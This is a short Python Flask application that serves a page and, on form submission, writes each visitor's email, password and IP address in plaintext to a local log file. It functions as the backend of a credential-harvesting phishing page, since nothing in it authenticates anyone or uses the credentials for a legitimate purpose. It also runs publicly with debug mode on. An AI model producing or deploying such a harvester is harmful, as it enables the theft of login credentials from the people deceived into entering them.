from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        with open('log.txt', 'a') as file:
            file.write(f"IP Address: {ip}\n")
            file.write(f"Email: {email}\n")
            file.write(f"Password: {password}\n")
    
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)